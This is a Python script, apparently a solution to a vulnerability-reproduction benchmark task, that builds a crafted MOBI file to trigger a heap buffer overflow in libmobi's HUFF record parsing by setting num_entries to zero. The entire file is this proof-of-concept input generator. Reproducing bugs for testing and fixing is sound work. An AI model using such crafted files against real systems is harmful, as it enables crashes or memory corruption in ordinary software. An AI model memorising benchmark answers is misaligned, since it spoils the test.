import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers a heap buffer overflow in libmobi (oss-fuzz:42536646).

        The vulnerability (CVE-2022-2629) is in `mobi_parse_huffdic`. It occurs when a
        HUFF record has `num_entries` set to 0. This leads to a `calloc(0, ...)` call,
        and a subsequent `memset` on the resulting pointer with a size of 512 bytes,
        causing a heap buffer overflow.

        This PoC constructs a minimal MOBI file (which is a Palm Database - PDB)
        with three records:
        1. A placeholder PalmDOC header.
        2. A MOBI header that points to the malicious HUFF record.
        3. The malicious HUFF record with `num_entries = 0`.

        All multi-byte integers are packed in big-endian format, as required
        by the PDB/MOBI specification.
        """
        
        # Record 2: The malicious HUFF record (28 bytes).
        # num_entries (at offset 24) is set to 0 to trigger the vulnerability.
        huff_record = b'HUFF' + struct.pack(
            '>IIIIII',
            28,    # header_length
            0,     # unknown1
            0,     # unknown2
            0,     # table1_offset
            0,     # table2_offset
            0      # num_entries = 0 (THE TRIGGER)
        )

        # Record 0: A placeholder for the PalmDOC header (16 bytes).
        palmdoc_header = b'\x00' * 16

        # Record 1: A minimal MOBI header (120 bytes) to ensure the HUFF record is parsed.
        mobi_header_len = 120
        mobi_header = bytearray(mobi_header_len)
        
        mobi_header[0:4] = b'MOBI'
        struct.pack_into('>I', mobi_header, 4, mobi_header_len)  # header_length
        struct.pack_into('>I', mobi_header, 8, 2)              # mobi_type
        struct.pack_into('>I', mobi_header, 12, 65001)         # text_encoding (UTF-8)
        struct.pack_into('>I', mobi_header, 84, 2)             # first_non_book_index
        struct.pack_into('>I', mobi_header, 112, 2)            # huffman_record_index
        struct.pack_into('>I', mobi_header, 116, 1)            # huffman_record_count

        records = [
            palmdoc_header,
            bytes(mobi_header),
            huff_record
        ]
        num_records = len(records)

        pdb_header_len = 78
        record_info_list_len = num_records * 8
        header_block_len = pdb_header_len + record_info_list_len

        record_offsets = []
        current_offset = header_block_len
        for rec in records:
            record_offsets.append(current_offset)
            current_offset += len(rec)

        # PDB header (78 bytes).
        pdb_header = bytearray(78)
        pdb_header[0:8] = b'PoC-Mobi'
        pdb_header[60:64] = b'BOOK'
        pdb_header[64:68] = b'MOBI'
        struct.pack_into('>H', pdb_header, 76, num_records)

        # PDB Record Info List.
        record_info_list = bytearray(record_info_list_len)
        for i, offset in enumerate(record_offsets):
            struct.pack_into('>I', record_info_list, i * 8, offset)

        # Assemble the final PoC file.
        poc_parts = [
            bytes(pdb_header),
            bytes(record_info_list),
            *records
        ]
        
        return b''.join(poc_parts)